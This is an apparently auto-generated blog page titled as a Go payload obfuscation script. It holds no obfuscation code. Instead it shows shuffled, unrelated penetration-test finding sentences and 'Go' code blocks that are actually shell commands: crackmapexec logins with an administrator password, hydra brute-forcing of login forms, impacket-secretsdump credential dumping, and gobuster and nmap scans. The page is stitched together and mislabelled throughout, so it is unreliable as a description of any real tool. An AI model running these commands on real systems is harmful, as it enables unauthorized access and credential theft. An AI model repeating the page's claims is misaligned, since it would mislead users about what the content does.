---
TitleSEO: "Payload Obfuscation Script in Go | ZureFX"
TitlePost: "Payload Obfuscation Script — Go"
Author: "ZureFX"
Description: "A Go script for payload obfuscation script. Built for security research and automation."
Keywords: "script, python, bash, go"
URL: "https://zurefx.github.io/scripting/script-payload-obfuscation-script-672.html"
URL_IMAGES: ""
Date: "2026-02-01"
Tags: "Script, Python, Bash, Go"
Section: "scripting"
Lang: "en"
main_img: "script-payload-obfuscation-script-672"
Permalink: "/scripting/script-payload-obfuscation-script-672.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The database credentials were hardcoded in the application source code. The web application was vulnerable to Server-Side Template Injection (SSTI). The scheduled task ran with elevated privileges and could be abused for escalation.

Built with **Go** for offensive security automation.

### Requirements

- Go
- `smbexec`
- `crackmapexec`
- `ffuf`

## Implementation

### Core Logic

Weak file permissions allowed modification of critical system files. Group Policy Preferences contained encrypted but recoverable credentials.

```go
crackmapexec smb 10.89.40.107 -u administrator -p 'P@ssw0rd!' --shares
gobuster dir -u http://10.85.133.59/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
crackmapexec smb 10.12.152.134 -u administrator -p 'P@ssw0rd!' --shares
```

Token impersonation allowed elevation to SYSTEM privileges on the target. Unconstrained delegation was enabled on the compromised machine.

### Helper Functions

Lateral movement was facilitated by reusing discovered credentials across services. Group Policy Preferences contained encrypted but recoverable credentials.

```go
gobuster dir -u http://10.95.13.156/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
crackmapexec smb 10.129.23.160 -u administrator -p 'P@ssw0rd!' --shares
feroxbuster -h
```

## Usage

### Basic Usage

Weak file permissions allowed modification of critical system files. The database credentials were hardcoded in the application source code.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.65.85.21 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.113.56.126 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

### Advanced Options

Unconstrained delegation was enabled on the compromised machine. Command injection was possible through unsanitized user input in the search functionality. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.69.96.170
nmap -sCV -p8080,53,110 10.35.158.94 -oN scan.txt
```

## Output

### Example Output

The web application was vulnerable to Server-Side Template Injection (SSTI). The kernel version was outdated and vulnerable to a publicly known exploit.

```
[+] Scanning target...
[+] Found 1 results
[+] Done in 3.81s
```
